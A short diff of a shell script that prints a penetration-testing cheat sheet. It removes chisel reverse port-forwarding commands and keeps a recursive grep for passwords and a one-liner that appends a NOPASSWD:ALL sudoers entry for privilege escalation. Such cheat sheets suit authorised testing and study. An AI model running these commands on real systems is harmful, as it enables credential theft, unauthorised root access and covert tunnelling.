@@ -32,10 +32,6 @@ echo -e "${Point} grep --color=auto -rn './' -ie \"pass\" --color=always 2>/dev/
 echo -e ""
 
 
-echo -e "${Frame}###${End} ${Title}Port Forwarding${End} ${Frame}###${End}"
-echo -e "${Point} chisel server -p 10000 --reverse"
-echo -e "${Point} chisel client \$server_ip:10000 R:\$port:127.0.0.1:\$port"
-echo -e ""
 
 echo -e "${Frame}###${End} ${Title}Linux PrivEsc Oneliner-Kill${End} ${Frame}###${End}"
 echo -e "${Point} echo \"<user> ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers"
